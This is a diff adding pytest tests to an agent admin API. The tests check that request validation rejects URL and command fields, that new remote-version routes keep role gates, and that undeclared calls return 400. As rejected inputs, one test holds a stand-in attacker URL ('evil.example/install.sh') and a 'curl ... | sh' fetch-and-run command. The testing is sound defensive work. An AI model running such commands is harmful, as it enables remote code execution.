@@ -2713,6 +2713,17 @@ class TestAgentAdminEndpoints:
 
         assert AgentActionRequest().consent is False
 
+    def test_the_request_model_rejects_a_url_from_the_ui(self):
+        """A button that took a URL would make Pollen remote code execution."""
+        from pydantic import ValidationError
+
+        from hivepilot.services.api_service import AgentActionRequest
+
+        with pytest.raises(ValidationError):
+            AgentActionRequest(consent=True, url="https://evil.example/install.sh")  # type: ignore[call-arg]
+        with pytest.raises(ValidationError):
+            AgentActionRequest(consent=True, command="curl http://x | sh")  # type: ignore[call-arg]
+
     def test_a_consented_action_reaches_the_service_with_the_actor(self, monkeypatch):
         seen: dict = {}
 
@@ -2754,12 +2765,33 @@ class TestAgentAdminEndpoints:
                 "/v1/agents/admin",
                 "/agents/{kind}/{action}",
                 "/v1/agents/{kind}/{action}",
+                "/agents/{kind}/remote-version",
+                "/v1/agents/{kind}/remote-version",
             ):
                 by_path[path.removeprefix("/v1")] = route
 
-        assert set(by_path) == {"/agents/admin", "/agents/{kind}/{action}"}
+        assert set(by_path) == {
+            "/agents/admin",
+            "/agents/{kind}/{action}",
+            "/agents/{kind}/remote-version",
+        }
         for route in by_path.values():
             assert route.dependant.dependencies, f"{route.path} shipped without its role gate"
+
+    def test_remote_version_without_a_declared_command_is_400(self, monkeypatch):
+        from fastapi import HTTPException
+
+        from hivepilot.services.api_service import agent_remote_version_endpoint
+        from hivepilot.services.token_service import TokenEntry
+
+        caller = TokenEntry(token="h" * 64, role="admin", note="jerome")
+        try:
+            agent_remote_version_endpoint("grok", caller)
+        except HTTPException as exc:
+            assert exc.status_code == 400
+            assert "read-remote-version" in exc.detail
+        else:
+            raise AssertionError("undeclared remote-version must 400")
 
 
 class TestAgentLoginEndpoint:
